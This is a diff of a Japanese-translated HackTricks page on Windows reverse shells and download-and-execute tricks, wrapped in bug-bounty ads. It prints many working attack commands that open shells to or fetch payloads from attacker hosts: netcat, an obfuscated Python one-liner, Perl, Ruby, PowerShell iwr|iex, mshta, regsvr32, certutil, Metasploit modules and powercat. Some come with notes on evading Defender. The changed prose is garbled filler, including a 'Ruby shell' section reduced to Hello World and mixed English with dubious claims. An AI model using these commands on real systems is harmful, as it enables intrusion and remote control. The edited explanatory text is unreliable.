@@ -6,13 +6,13 @@
 
 * **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProofはすべての暗号バグバウンティの場所です。**
 
@@ -20,10 +20,10 @@
 HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。
 
 **Web3ペントestingの経験を積む**\
-ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇中のWeb3セキュリティをマスターしましょう。
+ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。
 
 **Web3ハッカーレジェンドになる**\
-各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
+各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
 
 [**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！
 
@@ -32,7 +32,7 @@ HackenProofのバウンティは、顧客が報酬予算を入金した後に開
 ## Lolbas
 
 ページ[lolbas-project.github.io](https://lolbas-project.github.io/)は、Linuxの[https://gtfobins.github.io/](https://gtfobins.github.io/)のようなWindows向けです。\
-明らかに、**WindowsにはSUIDファイルやsudo特権はありません**が、いくつかの**バイナリ**がどのように（悪用されて）任意のコードを実行するかを知るのは役に立ちます。
+明らかに、**WindowsにはSUIDファイルやsudo特権はありません**が、いくつかの**バイナリ**がどのように（悪用されて）予期しないアクションを実行することができるかを知るのは役立ちます。
 
 ## NC
 ```bash
@@ -47,42 +47,66 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
-Perlは、多目的のスクリプト言語であり、Windowsシステムでのハッキングに使用することができます。Perlスクリプトは、Windowsシェルコマンドを実行するための強力なツールです。Perlを使用すると、システムの構成情報の収集、ファイルの操作、ユーザーの管理など、さまざまなタスクを自動化することができます。
+Perlは、多くのハッキングシナリオで使用される強力なスクリプト言語です。Perlスクリプトは、Windowsシステムでのペネトレーションテストや情報収集に役立ちます。
 
-Perlスクリプトを使用してWindowsシェルコマンドを実行するには、`system`関数を使用します。以下は、PerlスクリプトでWindowsシェルコマンドを実行する例です。
+### Windowsシェルの作成
+Windowsシェルを作成するために、Perlスクリプトを使用することができます。以下のスクリプトは、Windowsシステムでのシェルの作成方法を示しています。
 
 ```perl
-#!/usr/bin/perl
+use Win32::Console;
+use Win32::API;
 
-# Windowsシェルコマンドを実行する
-system("コマンド");
+my $console = Win32::Console->new();
+my $kernel32 = Win32::API->new('kernel32', 'SetConsoleTitle', ['P'], 'I');
+my $user32 = Win32::API->new('user32', 'ShowWindow', ['N', 'N'], 'I');
+
+$kernel32->Call('My Shell');
+$user32->Call(0, 0);
+
+while (1) {
+    $console->Write("My Shell> ");
+    my $cmd = <STDIN>;
+    chomp $cmd;
+    last if $cmd eq 'exit';
+    system($cmd);
+}
+
+$user32->Call(1, 0);
 ```
 
-上記の例では、`system`関数を使用してWindowsシェルコマンドを実行しています。`コマンド`の部分には、実行したいWindowsシェルコマンドを指定します。
+このスクリプトは、Win32::ConsoleとWin32::APIモジュールを使用しています。スクリプトを実行すると、Windowsシェルが開き、コマンドを入力することができます。"exit"と入力すると、シェルが終了します。
 
-Perlスクリプトを使用してWindowsシェルコマンドを実行する際には、セキュリティに注意する必要があります。不正なコマンドの実行やシステムへの悪意のあるアクセスを防ぐために、入力の検証やエスケープ処理を行うことが重要です。
-
-Perlは、Windowsシステムでのハッキングにおいて非常に便利なツールですが、適切な許可なしに使用することは違法です。常に法律と倫理に従い、正当な目的のためにのみ使用してください。
+このPerlスクリプトを使用することで、Windowsシステムでのペネトレーションテストや情報収集に役立つシェルを作成することができます。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## ルビー
 
-Rubyは、オブジェクト指向のスクリプト言語であり、多くのプログラミングタスクを簡単に実行するための強力なツールです。Rubyは、シンプルで読みやすい構文を持ち、柔軟性と拡張性に優れています。Rubyは、Webアプリケーションの開発や自動化スクリプトの作成など、さまざまな用途に使用されています。
+Rubyは、オブジェクト指向のスクリプト言語であり、多くのプラットフォームで動作します。Rubyは、シンプルで読みやすい構文を持ち、柔軟性と拡張性に優れています。Rubyは、Webアプリケーションの開発や自動化スクリプトの作成に広く使用されています。
 
-Rubyのシェルスクリプトは、Windows環境でのハッキングに役立ちます。Rubyのシェルスクリプトを使用すると、Windowsシステムに対して様々な攻撃を実行することができます。以下に、Rubyを使用したWindowsシェルスクリプトの例を示します。
+### Rubyのシェル
+
+Rubyのシェルは、Rubyスクリプトを実行するための環境です。Rubyのシェルを使用すると、コマンドラインからRubyスクリプトを実行し、結果を表示することができます。
+
+以下は、Rubyのシェルの例です。
 
 ```ruby
-require 'win32ole'
-
-shell = WIN32OLE.new('Shell.Application')
-shell.ShellExecute('cmd.exe', '', '', 'open', 1)
+puts "Hello, World!"
 ```
 
-このスクリプトは、Windowsのコマンドプロンプトを開くためにShellオブジェクトを使用しています。このスクリプトを実行すると、Windowsシステム上でコマンドプロンプトが開かれます。
+このスクリプトは、"Hello, World!"というメッセージを表示します。
 
-Rubyのシェルスクリプトは、Windowsシステム上での様々な操作や攻撃を実行するための強力なツールです。しかし、悪意のある目的で使用することは違法ですので、正当な目的のためにのみ使用してください。
+### Rubyのシェルの利点
+
+Rubyのシェルを使用すると、以下のような利点があります。
+
+- シンプルで読みやすい構文
+- 柔軟性と拡張性
+- 多くのプラットフォームで動作する
+- Webアプリケーションの開発や自動化スクリプトの作成に適している
+
+Rubyのシェルは、Rubyのスクリプトを実行するための便利なツールです。Rubyのシェルを使用して、効率的にプログラミング作業を行うことができます。
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -144,11 +168,15 @@ Powershellは、Windowsシステムで使用される強力なスクリプト言
 
 Powershellは、.NETフレームワークをベースにしており、Windowsの機能やAPIにアクセスするための豊富なコマンドレットを提供しています。これにより、システムの情報の取得や変更、ファイルの操作、ネットワークの管理など、さまざまなタスクを実行することができます。
 
-Powershellは、コマンドラインインターフェース（CLI）として使用することも、スクリプトとして実行することもできます。スクリプトを作成することで、複雑なタスクを自動化し、再利用可能なコードを作成することができます。
+Powershellは、コマンドラインインターフェース（CLI）として使用することも、スクリプトとして実行することもできます。スクリプトを作成することで、複数のコマンドや操作をまとめて実行することができます。
 
-Powershellは、Windowsシステムの監視、設定、および管理において非常に便利なツールです。セキュリティテストやペネトレーションテストにおいても、Powershellを使用してシステムの脆弱性を特定し、悪用することができます。
+Powershellは、システム管理者やセキュリティエンジニアにとって非常に便利なツールです。Powershellを使用することで、システムの監視、脆弱性のスキャン、ログの分析など、さまざまなセキュリティ関連のタスクを効率的に実行することができます。
 
-Powershellは、Windowsシステムでのハッキングやセキュリティテストにおいて重要なツールの一つです。Powershellの基本的なコマンドやスクリプトの作成方法を学ぶことは、ハッカーにとって非常に有益なスキルです。
+Powershellは、Windowsシステムでのハッキングやペネトレーションテストにおいても重要な役割を果たします。ハッカーは、Powershellを使用して悪意のあるスクリプトを実行し、システムに侵入したり、情報を盗んだりすることができます。
+
+Powershellの使用は、セキュリティ上のリスクを伴う場合があります。したがって、システム管理者やセキュリティエンジニアは、Powershellの使用に関する適切なポリシーや制限を設定することが重要です。また、Powershellのセキュリティ機能を活用し、悪意のあるスクリプトの実行を防止する必要があります。
+
+Powershellは、Windowsシステムでのハッキングやセキュリティテストにおいて重要なツールです。Powershellの基本的な機能やコマンドの理解は、ハッカーにとって必須のスキルです。
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -167,9 +195,39 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**このドキュメントの最後に、さまざまなPowershellシェルに関する詳細情報を取得できます**
+Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.
 
-## Mshta
+### Usage
+
+To execute a command using Mshta, you can use the following syntax:
+
+```
+mshta.exe javascript:command;
+```
+
+For example, to display a message box with the text "Hello, World!", you can use the following command:
+
+```
+mshta.exe javascript:alert('Hello, World!');
+```
+
+### Advantages
+
+Mshta can be useful in scenarios where you want to execute arbitrary commands on a target system without relying on traditional command-line utilities. Since HTAs are executed by the HTML Application Host, they have the ability to interact with the Windows shell and perform various actions.
+
+### Limitations
+
+It's important to note that Mshta may be detected by antivirus software due to its ability to execute arbitrary commands. Additionally, the use of Mshta may require administrative privileges on the target system.
+
+### Detection
+
+To detect the use of Mshta, you can monitor for the execution of the `mshta.exe` process or look for suspicious command-line arguments that include `javascript:`.
+
+### Mitigation
+
+To mitigate the risk of Mshta being used for malicious purposes, it is recommended to restrict the execution of `mshta.exe` through application whitelisting or by using security solutions that can detect and block its usage.
+
+For more information on different Powershell Shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -183,7 +241,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-ネットワークコールを実行するプロセス：**svchost.exe**\
+ネットワーク呼び出しを実行するプロセス：**svchost.exe**\
 ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**
 
 #### **hta-pshリバースシェルの例（htaを使用してPSバックドアをダウンロードして実行する）**
@@ -239,7 +297,7 @@ Metasploit, a popular penetration testing framework, provides a module called `e
 
 To use the `exploit/windows/browser/mshta` module in Metasploit, you need to set the required options such as the target IP address, payload, and listener. Once the options are set, you can run the exploit and gain access to the target system.
 
-It is important to note that using this technique may trigger antivirus alerts, as it is a known attack vector. Therefore, it is recommended to use this method in controlled environments or with proper authorization during penetration testing engagements.
+It is important to note that using Mshta for malicious purposes is illegal and unethical. This information is provided for educational purposes only and should not be used for any illegal activities.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -289,39 +347,21 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages the Rundll32 utility to execute malicious DLLs.
 
-To use this module, you need to provide the path to the malicious DLL file using the `DLL` option. Additionally, you can specify the function name to be executed using the `FUNCTION` option. If no function name is provided, the module will execute the `DllMain` function by default.
+To use this module, you need to provide the path to the malicious DLL and the function name to execute. The DLL can be hosted on a remote server or transferred to the target machine. Once executed, the DLL can perform various actions, such as establishing a reverse shell or executing arbitrary commands.
 
-Here is an example of how to use the `windows/local/execute` module in Metasploit:
+The `windows/local/execute` module can be used in various scenarios, such as post-exploitation or lateral movement. It is important to note that the target machine must have the appropriate privileges to execute the DLL.
 
-```
-use windows/local/execute
-set DLL /path/to/malicious.dll
-set FUNCTION FunctionName
-run
-```
+To execute a DLL using Rundll32 with Metasploit, follow these steps:
 
-Once executed, the module will load the specified DLL and execute the specified function. This technique can be useful for bypassing security measures and executing arbitrary code on a target system.
+1. Start Metasploit by running the `msfconsole` command.
+2. Search for the `windows/local/execute` module using the `search` command.
+3. Load the `windows/local/execute` module using the `use` command.
+4. Set the required options, such as the `DLL` and `FUNCTION` parameters.
+5. Run the module using the `run` command.
 
-It is important to note that the Rundll32 utility is commonly used by legitimate Windows processes, so its usage may not raise suspicion. However, it is crucial to ensure that the DLL being executed is malicious and not a legitimate system file.
+Once the module is executed, the specified DLL function will be executed on the target machine. This can provide the attacker with remote access or control over the compromised system.
 
-#### **Rundll32 - Metasploit**
-
-Rundll32は、DLL（Dynamic Link Library）関数の実行を可能にするWindowsユーティリティです。人気のあるペネトレーションテストフレームワークであるMetasploitは、`windows/local/execute`というモジュールを提供しており、Rundll32ユーティリティを利用して悪意のあるDLLを実行することができます。
-
-このモジュールを使用するには、`DLL`オプションを使用して悪意のあるDLLファイルのパスを指定する必要があります。さらに、`FUNCTION`オプションを使用して実行する関数名を指定することもできます。関数名が指定されていない場合、モジュールはデフォルトで`DllMain`関数を実行します。
-
-以下は、Metasploitで`windows/local/execute`モジュールを使用する例です。
-
-```
-use windows/local/execute
-set DLL /path/to/malicious.dll
-set FUNCTION 関数名
-run
-```
-
-実行すると、モジュールは指定されたDLLをロードし、指定された関数を実行します。この技術は、セキュリティ対策を回避し、ターゲットシステムで任意のコードを実行するために役立ちます。
-
-Rundll32ユーティリティは、合法的なWindowsプロセスによって一般的に使用されるため、使用しても疑いをかけられない場合があります。ただし、実行されるDLLが悪意のあるものであり、合法的なシステムファイルではないことを確認することが重要です。
+It is important to use this technique responsibly and only in authorized penetration testing engagements. Unauthorized use of this technique can lead to legal consequences.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -343,7 +383,7 @@ Replace `<path_to_malicious_dll>` with the path to the generated DLL file and `<
 
 Once the DLL file is loaded, Koadic establishes a communication channel with the compromised system, allowing the attacker to execute various commands and perform post-exploitation activities.
 
-It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only to raise awareness about potential security risks.
+It is important to note that the Rundll32-Koadic technique is just one of many methods used in post-exploitation scenarios. It is essential for ethical hackers and security professionals to understand and be familiar with various techniques to effectively assess and secure systems against potential attacks.
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -400,17 +440,31 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Regsvr32 - Metasploit**
 
-Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. Metasploit provides a module called `regsvr32_command_delivery` that leverages this utility to execute malicious code on a target system.
+#### **Regsvr32 - Metasploit**
 
-To use this module, follow these steps:
+Regsvr32 is a Windows command-line utility used to register and unregister DLLs (Dynamic Link Libraries) and ActiveX controls in the Windows Registry. This utility can also be used to execute arbitrary code on a target system.
 
-1. Start Metasploit by running `msfconsole` in your terminal.
-2. Search for the `regsvr32_command_delivery` module by typing `search regsvr32_command_delivery`.
-3. Load the module by typing `use exploit/windows/local/regsvr32_command_delivery`.
-4. Set the required options, such as `SESSION` and `CMD`.
-5. Run the exploit by typing `exploit`.
+Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It can be used to exploit vulnerabilities in various systems and gain unauthorized access.
 
-This technique can be useful during a penetration test to gain remote access to a Windows system. However, it is important to note that using this technique without proper authorization is illegal and unethical. Always ensure you have the necessary permissions before attempting any penetration testing activities.
+By combining the functionality of Regsvr32 with the capabilities of Metasploit, it is possible to create a malicious DLL file that, when registered using Regsvr32, will execute a payload from Metasploit on the target system.
+
+The following steps outline the process of using Regsvr32 with Metasploit:
+
+1. Generate a malicious DLL file using Metasploit's msfvenom tool. This file will contain the payload that will be executed on the target system.
+
+2. Transfer the malicious DLL file to the target system. This can be done using various methods, such as email attachments, USB drives, or exploiting vulnerabilities in network services.
+
+3. Register the malicious DLL file on the target system using the Regsvr32 utility. This can be done by running the following command in a command prompt:
+
+   ```
+   regsvr32 /s <path_to_malicious_dll>
+   ```
+
+   Replace `<path_to_malicious_dll>` with the actual path to the malicious DLL file.
+
+4. Once the DLL file is registered, the payload from Metasploit will be executed on the target system, allowing the attacker to gain unauthorized access or perform other malicious actions.
+
+It is important to note that using Regsvr32 with Metasploit is considered an advanced technique and should only be used in controlled environments for legitimate purposes, such as penetration testing or authorized security assessments. Unauthorized use of this technique can lead to legal consequences.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -433,12 +487,12 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Defenderによって検出されました**
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProofはすべての暗号バグ報奨金の場所です。**
 
 **遅延なしで報酬を受け取る**\
-HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。
+HackenProofの報奨金は、顧客が報奨金予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。
 
 **Web3ペントestingの経験を積む**\
 ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期において、Web3セキュリティをマスターしましょう。
@@ -511,7 +565,7 @@ wmic os get /format:"https://webserver/payload.xsl"
 ネットワーク呼び出しを実行するプロセス：**wmic.exe**\
 ディスク上に書き込まれたペイロード：**IEローカルキャッシュ**
 
-例のxslファイル：
+例：xslファイル：
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -596,13 +650,13 @@ Defenderはそれを悪意のあるコードとして検出しません（まだ
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-ダウンロードし、ウェブサーバーを起動し、リスナーを起動し、被害者の端末で実行します。
+ダウンロードし、ウェブサーバーを起動し、リスナーを起動し、被害者の端末で実行します：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 Defenderはそれを悪意のあるコードとして検出しません（まだ、2019年3月4日現在）。
 
-**powercatによって提供される他のオプション:**
+**powercatが提供する他のオプション:**
 
 バインドシェル、リバースシェル（TCP、UDP、DNS）、ポートリダイレクト、アップロード/ダウンロード、ペイロードの生成、ファイルの提供...
 ```
@@ -629,7 +683,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**悪意のあるコードとして検出されました**
+**悪意のあるコードが検出されました**
 
 ### MSF-Unicorn
 
@@ -667,8 +721,8 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## 詳細
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack)は、いくつかの攻撃的なPSモジュールが事前にロードされたPSコンソールです（暗号化済み）\
-[WinPWN](https://github.com/SecureThisShit/WinPwn)は、いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソールです（IEX）
+[PS>Attack](https://github.com/jaredhaight/PSAttack) は、いくつかの攻撃的なPSモジュールが事前にロードされたPSコンソールです（暗号化済み）\
+[WinPWN](https://github.com/SecureThisShit/WinPwn) は、いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソールです（IEX）
 
 ## 参考文献
 
@@ -681,7 +735,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProofはすべての暗号バグ報奨金の場所です。**
 
